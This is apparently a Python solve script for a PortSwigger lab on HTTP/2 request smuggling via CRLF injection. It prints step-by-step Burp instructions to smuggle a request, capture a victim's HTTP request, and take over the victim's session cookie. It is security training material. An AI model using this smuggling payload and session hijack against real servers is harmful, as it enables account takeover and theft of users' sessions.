#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
HTTP/2 request smuggling via CRLF injection.

Documentation-first — scripting this requires low-level HPACK framing to
insert a real CRLF byte inside a header value. Manual Burp Inspector + Shift+Enter
is the clean path.

Manual steps:

  1. Log in as wiener:peter, grab session cookie.
  2. Burp Repeater, Inspector → HTTP/2, Update Content-Length off.
  3. Inspector → Request Attributes → add header:
       Name:  foo
       Value: bar<Shift+Enter> Transfer-Encoding: chunked
     (Shift+Enter inserts a real CRLF — don't type the literal \\r\\n.)
  4. Set body:
       0

       POST / HTTP/1.1
       Host: LAB-ID.web-security-academy.net
       Cookie: session=YOUR-SESSION
       Content-Length: 800

       search=x
  5. Send. Wait ~15s.
  6. Browser: reload home page, check "Recent searches" for captured victim request.
  7. Copy victim session, swap in DevTools, reload.
"""

import argparse
import re


MANUAL_INSTRUCTIONS = """
Burp Repeater (Inspector → HTTP/2, Update Content-Length off):

1. Add header via Inspector → Request Attributes:
   Name:  foo
   Value: bar<Shift+Enter> Transfer-Encoding: chunked
   (Shift+Enter = real CRLF. Typing the characters '\\r\\n' as text does NOT work.)

2. Body (below headers blank line):

----------------------------------------
0

POST / HTTP/1.1
Host: {host}
Cookie: session=YOUR-SESSION
Content-Length: 800

search=x
----------------------------------------

3. Send. Wait ~15s for victim traffic.
4. Browser → lab home → check "Recent searches" for a captured entry starting with 'x' followed by raw HTTP.
5. Copy victim's session= value from the captured text.
6. DevTools → Cookies → replace your session with victim's → reload.

Lab solves when logged in as victim.
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 15: HTTP/2 CRLF injection smuggling (manual steps printed)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    host = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(host=host))


if __name__ == "__main__":
    main()
